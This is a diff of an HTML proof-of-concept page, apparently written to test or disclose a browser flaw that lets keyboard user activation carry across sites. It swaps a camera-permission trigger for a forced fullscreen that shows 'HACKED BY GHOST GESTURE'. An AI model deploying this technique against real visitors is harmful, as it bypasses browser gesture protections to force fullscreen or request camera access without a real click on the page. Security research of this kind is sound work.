@@ -2,28 +2,22 @@
 <html>
 
 <head>
-    <title>PoC - Site B (Camera Prompt)</title>
+    <title>PoC - Site B (Fullscreen)</title>
     <style>
         body {
             font-family: monospace;
-            background: white;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            background: white;
         }
 
         #timer {
             font-size: 3rem;
             font-weight: bold;
-        }
-
-        #status {
-            margin-top: 20px;
-            color: #666;
-            text-align: center;
         }
     </style>
 </head>
@@ -31,7 +25,7 @@
 <body>
 
     <div id="timer">2s...</div>
-    <div id="status">Tahan "Enter" sampai 1s</div>
+    <div id="status">Tahan "Enter" lalu lepas di 1s</div>
 
     <script>
         setTimeout(() => { document.getElementById('timer').innerText = "1s..."; }, 1000);
@@ -43,16 +37,19 @@
 
                 if (navigator.userActivation.isActive) {
                     try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                        stream.getTracks().forEach(track => track.stop());
+                        await document.documentElement.requestFullscreen();
 
-                        status.innerHTML = "<b style='color:black;'>✅ SUCCESS: Camera Prompt Triggered & Permission Granted!</b>";
+                        document.body.innerHTML = `
+                            <h1 style="color:red;">HACKED BY GHOST GESTURE</h1>
+                            <p>Layar Anda berhasil dipaksa masuk Fullscreen tanpa klik di halaman ini!</p>
+                            <button onclick="document.exitFullscreen()">Keluar</button>
+                        `;
                     } catch (err) {
-                        status.innerHTML = `<b style='color:red;'>RESULT: ${err.name}</b><br>${err.message}`;
-                        console.log("Trigger failed:", err);
+                        console.log("Fullscreen failed:", err);
+                        alert("Ghost Gesture Terdeteksi Aktif, tapi Fullscreen diblokir Sandbox: " + err.name);
                     }
                 } else {
-                    status.innerText = "RESULT: EXPIRED (User Activation was not preserved)";
+                    alert("Gagal: User Activation tidak terbawa.");
                 }
             }
         });
